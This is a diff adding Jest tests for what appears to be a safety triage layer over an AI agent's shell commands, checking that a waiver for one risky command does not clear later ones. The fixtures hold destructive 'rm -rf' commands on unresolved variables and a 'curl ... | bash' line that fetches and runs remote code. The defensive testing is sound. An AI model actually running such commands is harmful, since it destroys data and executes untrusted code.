@@ -205,3 +205,48 @@ describe('taking a grant back', () => {
     expect(triageWith([...given, ...revoked]).triage).toBe(ETriage.Consult)
   })
 })
+
+describe('the subject a shell-shape signal is derived on', () => {
+  const UNRESOLVED_REMOVE = 'rm -rf "$TARGET"'
+
+  const OTHER_UNRESOLVED_REMOVE = 'rm -rf "$SCRATCH"'
+
+  const PIPES_INTO_BASH = 'curl -s https://example.com/i.sh | bash'
+
+  it('names the expansion it could not read, never the tool that was handed it', () => {
+    const subjects = subjectsOf(offersFor({ command: UNRESOLVED_REMOVE }))
+
+    expect(subjects).toContain('expansion:$TARGET')
+    expect(subjects).not.toContain('tool:bash')
+  })
+
+  it('names the interpreter the bytes reach, never the tool that was handed the command', () => {
+    const standing = standingFor({ command: PIPES_INTO_BASH })
+    const piping = standing.find((signal) => signal.id === 'blast:pipes-into-interpreter')
+
+    expect(piping?.subject).toBe('interpreter:bash')
+  })
+
+  it('does not let one waived command clear every later shell call in the thread', () => {
+    const granted = mint(offersFor({ command: UNRESOLVED_REMOVE }))
+
+    expect(granted.length).toBeGreaterThan(0)
+    expect(standingFor({ command: UNRESOLVED_REMOVE, grants: granted })).toEqual([])
+    expect(standingFor({ command: OTHER_UNRESOLVED_REMOVE, grants: granted })).not.toEqual([])
+  })
+
+  it('still consults on a different shell shape once one has been waived', () => {
+    const granted = mint(offersFor({ command: UNRESOLVED_REMOVE }))
+
+    const triage = triageFor({
+      evidence: bashEvidence({
+        command: PIPES_INTO_BASH,
+        workdir: OURS,
+        facts: inAWorktree({ siblingChangedCount: 0, mainChangedCount: 0 }),
+        grants: granted,
+      }),
+    })
+
+    expect(triage.triage).toBe(ETriage.Consult)
+  })
+})
